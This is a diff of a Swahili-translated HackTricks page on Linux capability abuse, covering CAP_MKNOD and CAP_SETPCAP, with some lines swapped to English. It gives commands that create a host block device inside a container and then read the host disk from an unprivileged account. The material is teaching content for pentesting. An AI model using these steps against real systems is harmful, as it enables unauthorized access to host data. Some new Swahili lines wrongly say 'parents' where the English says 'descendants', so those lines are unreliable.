 1. **Kwenye Mwenyeji kama Mtumiaji wa Kawaida:**
-- Tambua kitambulisho chako cha sasa cha mtumiaji na `id`, kwa mfano, `uid=1000(standarduser)`.
-- Tambua kifaa cha lengo, kwa mfano, `/dev/sdb`.
+- Tambua kitambulisho chako cha mtumiaji wa sasa kwa kutumia `id`, mfano, `uid=1000(standarduser)`.
+- Tambua kifaa kinacholengwa, kwa mfano, `/dev/sdb`.
 
-2. **Ndani ya Kontena kama `root`:**
+2. **Ndani ya Chombo kama `root`:**
 ```bash
 # Create a block special file for the host device
 mknod /dev/sdb b 8 16
@@ -1610,7 +1538,7 @@ useradd -u 1000 standarduser
 # Switch to the newly created user
 su standarduser
 ```
-3. **Rudi kwenye Mwenyeji:**
+3. **Rudi kwenye Host:**
 ```bash
 # Locate the PID of the container process owned by "standarduser"
 # This is an illustrative example; actual command might vary
@@ -1619,27 +1547,27 @@ ps aux | grep -i container_name | grep -i standarduser
 # Access the container's filesystem and the special block device
 head /proc/12345/root/dev/sdb
 ```
-Hii njia inaruhusu mtumiaji wa kawaida kupata na labda kusoma data kutoka `/dev/sdb` kupitia kontena, kwa kutumia nafasi za mtumiaji zilizoshirikiwa na ruhusa zilizowekwa kwenye kifaa.
+This approach allows the standard user to access and potentially read data from `/dev/sdb` through the container, exploiting shared user namespaces and permissions set on the device.
 
-### CAP_SETPCAP
+### CAP\_SETPCAP
 
-**CAP_SETPCAP** inawezesha mchakato kubadilisha seti za uwezo za mchakato mwingine, kuruhusu kuongeza au kuondoa uwezo kutoka kwenye seti za uwezo zilizopo, kurithiwa, na kuruhusiwa. Walakini, mchakato huo unaweza tu kubadilisha uwezo ambao una katika seti yake ya kuruhusiwa, kuhakikisha kuwa hauwezi kuinua mamlaka ya mchakato mwingine zaidi ya mamlaka yake mwenyewe. Maboresho ya hivi karibuni kwenye kernel yameimarisha sheria hizi, kuzuia `CAP_SETPCAP` kufanya tu uwezo wa kupunguza katika seti zake za kuruhusiwa au za watoto wake, lengo likiwa kupunguza hatari za usalama. Matumizi yanahitaji kuwa na `CAP_SETPCAP` katika seti ya uwezo inayofanya kazi na uwezo wa lengo katika seti ya kuruhusiwa, kwa kutumia `capset()` kwa marekebisho. Hii inafupisha kazi kuu na mipaka ya `CAP_SETPCAP`, ikionyesha jukumu lake katika usimamizi wa mamlaka na kuimarisha usalama.
+**CAP_SETPCAP** enables a process to **alter the capability sets** of another process, allowing for the addition or removal of capabilities from the effective, inheritable, and permitted sets. However, a process can only modify capabilities that it possesses in its own permitted set, ensuring it cannot elevate another process's privileges beyond its own. Recent kernel updates have tightened these rules, restricting `CAP_SETPCAP` to only diminish the capabilities within its own or its descendants' permitted sets, aiming to mitigate security risks. Usage requires having `CAP_SETPCAP` in the effective set and the target capabilities in the permitted set, utilizing `capset()` for modifications. This summarizes the core function and limitations of `CAP_SETPCAP`, highlighting its role in privilege management and security enhancement.
 
-**`CAP_SETPCAP`** ni uwezo wa Linux ambao inaruhusu mchakato kubadilisha seti za uwezo za mchakato mwingine. Inatoa uwezo wa kuongeza au kuondoa uwezo kutoka kwenye seti za uwezo zilizopo, kurithiwa, na kuruhusiwa za mchakato mwingine. Walakini, kuna vizuizi fulani juu ya jinsi uwezo huu unaweza kutumika.
+**`CAP_SETPCAP`** ni uwezo wa Linux unaoruhusu mchakato **kubadilisha seti za uwezo za mchakato mwingine**. Inatoa uwezo wa kuongeza au kuondoa uwezo kutoka kwa seti za uwezo zinazofaa, zinazorithiwa, na zinazoruhusiwa za michakato mingine. Hata hivyo, kuna vizuizi fulani juu ya jinsi uwezo huu unaweza kutumika.
 
-Mchakato wenye `CAP_SETPCAP` **anaweza tu kutoa au kuondoa uwezo ambao upo katika seti yake ya uwezo iliyoruhusiwa**. Kwa maneno mengine, mchakato hauwezi kutoa uwezo kwa mchakato mwingine ikiwa hauna uwezo huo mwenyewe. Kizuizi hiki kinazuia mchakato kuinua mamlaka ya mchakato mwingine zaidi ya kiwango chake cha mamlaka.
+Mchakato wenye `CAP_SETPCAP` **unaweza tu kutoa au kuondoa uwezo ambao uko katika seti yake ya uwezo inayoruhusiwa**. Kwa maneno mengine, mchakato hauwezi kutoa uwezo kwa mchakato mwingine ikiwa haujakuwa na uwezo huo mwenyewe. Kizuizi hiki kinazuia mchakato kuinua mamlaka ya mchakato mwingine zaidi ya kiwango chake mwenyewe cha mamlaka.
 
-Zaidi ya hayo, katika toleo jipya la kernel, uwezo wa `CAP_SETPCAP` umepata **kizuizi zaidi**. Sasa haikuruhusu mchakato kubadilisha seti za uwezo za mchakato mwingine kwa hiari. Badala yake, **inaruhusu mchakato kupunguza uwezo katika seti yake ya uwezo iliyoruhusiwa au seti ya uwezo iliyoruhusiwa ya watoto wake**. Mabadiliko haya yalifanywa ili kupunguza hatari za usalama zinazohusiana na uwezo huo.
+Zaidi ya hayo, katika toleo za hivi karibuni za kernel, uwezo wa `CAP_SETPCAP` umekuwa **ukizuiwa zaidi**. Hauruhusu tena mchakato kubadilisha seti za uwezo za michakato mingine kwa njia isiyo ya kawaida. Badala yake, **inaruhusu tu mchakato kupunguza uwezo katika seti yake ya uwezo inayoruhusiwa au seti za uwezo zinazoruhusiwa za wazazi wake**. Mabadiliko haya yaliletwa ili kupunguza hatari za usalama zinazoweza kutokea zinazohusiana na uwezo huo.
 
-Ili kutumia `CAP_SETPCAP` kwa ufanisi, unahitaji kuwa na uwezo huo katika seti yako ya uwezo inayofanya kazi na uwezo wa lengo katika seti yako ya uwezo iliyoruhusiwa. Kisha unaweza kutumia wito wa mfumo wa `capset()` kubadilisha seti za uwezo za mchakato mwingine.
+Ili kutumia `CAP_SETPCAP` kwa ufanisi, unahitaji kuwa na uwezo huo katika seti yako ya uwezo inayofaa na uwezo wa lengo katika seti yako ya uwezo inayoruhusiwa. Unaweza kisha kutumia wito wa mfumo wa `capset()` kubadilisha seti za uwezo za michakato mingine.
 
-Kwa muhtasari, `CAP_SETPCAP` inaruhusu mchakato kubadilisha seti za uwezo za mchakato mwingine, lakini hauwezi kutoa uwezo ambao hauna mwenyewe. Zaidi ya hayo, kutokana na wasiwasi wa usalama, utendaji wake umepunguzwa katika toleo jipya la kernel ili kuruhusu tu kupunguza uwezo katika seti yake ya uwezo iliyoruhusiwa au seti ya uwezo iliyoruhusiwa ya watoto wake.
+Kwa muhtasari, `CAP_SETPCAP` inaruhusu mchakato kubadilisha seti za uwezo za michakato mingine, lakini haiwezi kutoa uwezo ambao haina mwenyewe. Zaidi ya hayo, kutokana na wasiwasi wa usalama, kazi yake imepunguzika katika toleo za hivi karibuni za kernel ili kuruhusu tu kupunguza uwezo katika seti yake ya uwezo inayoruhusiwa au seti za uwezo zinazoruhusiwa za wazazi wake.
 
-## Marejeo
+## References
 
-**Mifano mingi ya hii ilichukuliwa kutoka kwa maabara fulani za** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), kwa hivyo ikiwa unataka kufanya mazoezi ya mbinu hizi za kuongeza mamlaka, napendekeza maabara haya.
+**Most of these examples were taken from some labs of** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), so if you want to practice this privesc techniques I recommend these labs.
 
-**Marejeo mengine**:
+**Other references**:
 
 * [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
 * [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
@@ -1652,20 +1580,22 @@ Kwa muhtasari, `CAP_SETPCAP` inaruhusu mchakato kubadilisha seti za uwezo za mch
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **kukuza maarifa ya kiufundi**, mkutano huu ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila uwanja.
+[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.
 
 {% embed url="https://www.rootedcon.com/" %}
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+</details>
+{% endhint %}
